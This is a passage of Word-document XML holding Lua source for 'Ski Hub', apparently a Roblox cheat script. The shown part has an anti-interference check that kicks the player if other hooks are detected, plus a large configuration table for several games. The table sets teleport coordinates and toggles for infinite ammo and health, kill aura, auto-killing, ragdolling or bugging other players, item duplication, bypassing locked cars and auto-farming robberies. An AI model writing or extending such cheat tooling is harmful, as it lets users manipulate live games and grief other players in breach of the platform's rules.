        <w:t>end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local FireServer, InvokeServer, UnreliableFireServer = Instance.new("RemoteEvent").FireServer, Instance.new("RemoteFunction").InvokeServer, Instance.new("UnreliableRemoteEvent").FireServer</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if isfunctionhooked then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if isfunctionhooked(FireServer) or isfunctionhooked(UnreliableFireServer) or isfunctionhooked(InvokeServer) and LPH_OBFUSCATED then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return Services.LocalPlayer:Kick("Ski Hub | Security : You are running another script, please disable it and execute again")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local SafePosition = CFrame.new(-437, 33, 6653)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Config = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["TheBronx"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Selected_Item"] = "...";</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       ["TeleportationList"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Deli Market 🥪"] = CFrame.new(-735.50, 254.69, -686.72);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Bank 🏦"] = CFrame.new(-225.64, 283.81, -1214.61);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Ice Box 🧊"] = CFrame.new(-198.8927001953125, 283.8486633300781, -1170.4500732421875);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Safe 🔒"] = CFrame.new(68519.52, 52941.68, -792.38);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Hotel 🏨"] = CFrame.new(-1012, 266, -933);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Drip Store 👓"] = CFrame.new(67462.6953125, 10489.0322265625, 546.6762084960938);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Car Dealer 🚗"] = CFrame.new(-407.01, 253.41, -1243.18);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Laundromat 💷"] = CFrame.new(-979.4635620117188, 253.65318298339844, -689.3339233398438);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Studio 🎙"] = CFrame.new(93408.453125, 14484.7158203125, 570.139404296875);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Night Club 🥂"] = CFrame.new(-90.03, 283.75, -728.01);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Robbable Ice Box 🧊"] = CFrame.new(-209.68360900878906, 283.4959411621094, -1265.5286865234375);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Exotic Shop 🍃"] = CFrame.new(-1521.943115234375, 272.5462646484375, -984.3020629882812);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Bronx Market 💲"] = CFrame.new(-402.34, 334.31, -556.81);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Gun Shop 🔫"] = CFrame.new(92978, 122099, 17232);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Second Gun Shop 🔫"] = CFrame.new(66202, 123615.7109375, 5749.81689453125);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Exotic Guns 🔫"] = CFrame.new(60829.00, 87609.32, -352.87);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Third Gun Shop 🔫"] = CFrame.new(-1441.51, 256.06, 2195.35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Studio Guns 🔫"] = CFrame.new(72421.93, 128855.83, -1082.59);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Construction Job 🔨"] = CFrame.new(-1729, 371, -1171);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Soda job 🧴"] = CFrame.new(-375.43, 254.20, -582.74);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Hospital 🏢 "] = CFrame.new(-1579.79, 253.95, 27.17);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Margreens 💊 "] = CFrame.new(-345.25, 254.45, -392.41);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Old PentHouse 🏡 "] = CFrame.new(-597.20, 356.55, -688.55);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["PentHouse 🌇 "] = CFrame.new(-130.14, 397.14, -564.70);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Old WareHouse 🏭"] = CFrame.new(-176.92, 284.63, -290.31);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["New WareHouse 🏭"] = CFrame.new(-108.66, 283.81, -409.45);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Sell Soda 💲"] = CFrame.new(-1290.79, 253.30, -3004.93);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Striker Man 🚙"] = CFrame.new(-1424.99, 254.22, 2786.90);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BookBags 🎒"] = CFrame.new(-693.79, 253.78, -681.57);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Prison ⛓️"] = CFrame.new(-1120.29, 254.90, -3364.86);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["NYPD Roof 👮"] = CFrame.new(-1389.98, 279.44, -3141.37);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Mansion  🏤🩸"] = CFrame.new(-792.72, 253.31, 1400.73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SledgeHammer Job 🔨"] = CFrame.new(-1007.64, 262.26, 56.05);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Bury Money ⚰️"] = CFrame.new(-198.53, 239.51, 1266.04);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["McDonalds 🍔"] = CFrame.new(-1011.34, 253.93, -1147.76);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Popeyes 🍗"] = CFrame.new(-78.04, 283.63, -768.11);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Modifications"] = newproxy(true);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["_Modifications"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DisableJamming"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifySpreadValue"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifyRecoilValue"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Automatic"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifyFireRate"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifyReloadSpeed"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifyEquipSpeed"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteAmmo"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteClips"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteDamage"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FireRateSpeed"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpreadPercentage"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["RecoilPercentage"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ReloadSpeed"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["EquipSpeed"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["PlayerModifications"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteSleep"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteStamina"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteHunger"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantInteract"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FastRespawn"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AutoPickupCash"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AutoPickupBags"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DisableCameraBobbing"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BypassLockedCars"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DisableBloodEffects"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["NoRentPay"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AntiLoseItems"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Ski HubNameTag"] = false;            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["NoJumpCooldown"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["NoFallDamage"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["NoKnockback"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteHealth"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["RespawnWhereYouDied"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["InfiniteHealth"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["StoreDupedItem"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Selected_Location"] = "...";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["ClickTeleportActive"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["PlayerUtilities"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SelectedPlayer"] = "...";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BringingPlayer"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpectatePlayer"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AutoKill"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AutoRagdoll"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BugPlayer"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["VehicleModifications"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpeedEnabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpeedValue"] = 10/1000;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BreakEnabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BreakValue"] = 50/1000;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantStop"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantStopBind"] = Enum.KeyCode.V;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Farms"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["CollectDroppedMoney"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["CollectDroppedLoot"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["OnlyCollectGuns"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AFKCheck"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FarmConstructionJob"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FarmBank"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FarmHouses"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FarmStudio"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FarmTrash"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AutoSellTrash"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["KillAura"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["KillAuraRange"] = 300;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["KillAuraWhitelist"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["AutoDrop"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["MoneyAmount"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["carfly"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["carflyspeed"] = 20;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["antiafk"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["spinbotter"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["spinbotterspeed"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["autopass"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">         ["maskedup"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["depos"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["DepositAmount"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["draww"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["WithdrawAmount"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["invisfly"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["invisflyspeed"] = 50;        </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["tb3_fov"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FieldOfViewValue"] = 80;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["flynew"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["in321y"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["in31"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["BlockSpin"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["LocalPlayer"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteStamina"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["AutoFarming"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FarmMops"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["MopType"] = "Default";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["Road_To_Riches"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["_Modifications"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ExplosiveBullets"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteAmmo"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteDamage"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantReload"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantEquip"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Automatic"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["RapidFire"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["NoSpread"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["NoRecoil"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Locations"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ATM 🏧"] = CFrame.new(360, 2563, 1946);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Gun Dealer 🔫"] = CFrame.new(231, 2545, 1065);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Gold Shop 🪙"] = CFrame.new(-78.1158218383789, 2563.1123046875, 944.74365234375);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Barber 💈"] = CFrame.new(1217.6531982421875, 2557.93896484375, 981.182861328125);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Monderella 🍕"] = CFrame.new(428.89581298828125, 2563.31005859375, 1275.4918212890625);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Deli 🥪"] = CFrame.new(-70.2744369506836, 2562.807861328125, 719.9676513671875);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Library 📖"] = CFrame.new(53.477169036865234, 2562.908203125, 1960.6444091796875);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Laboratory 🔬"] = CFrame.new(564, 2563, 1957);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Hot Dog Stand 🌭"] = CFrame.new(295.57403564453125, 2562.7646484375, 1996.2435302734375);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Gym 💪" ] = CFrame.new(-37.920719146728516, 2563.05029296875, 442.32647705078125);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Banks Burgers 🍔"] = CFrame.new(794.2547607421875, 2562.93701171875, 311.8097229003906);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Laundromat 💷"] = CFrame.new(402.6617126464844, 2562.892822265625, 1503.2645263671875);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Cocaine Factory 🏭"] = CFrame.new(1227, 2529, 1987);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Cooking Pots 🧪"] = CFrame.new(131, 2540, 1004);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Scrap Metal ⚒️"] = CFrame.new(1049, 2563, 1052);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["PackFarm"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AllowedPacks"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AllowedJunkies"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["InfiniteClips"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["InfiniteStamina"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["InfiniteEnergy"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Modifications"] = newproxy(true);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["InstantInteract"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["ESP"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Pots"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["AllowedPots"] = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["South_Bronx"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["LocalPlayer_Config"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantInteract"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DeleteOnKey"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DeleteKey"] = nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["NoClip"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["HideName"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteStamina"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Speed"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpeedValue"] = 0.75;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["TeleportMethod"] = "Damage";</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FarmingUtilities"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["CardFarm"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BoxFarm"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ChipFarm"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["MarshmallowFarm"] = false;</w:t>
      </w:r>
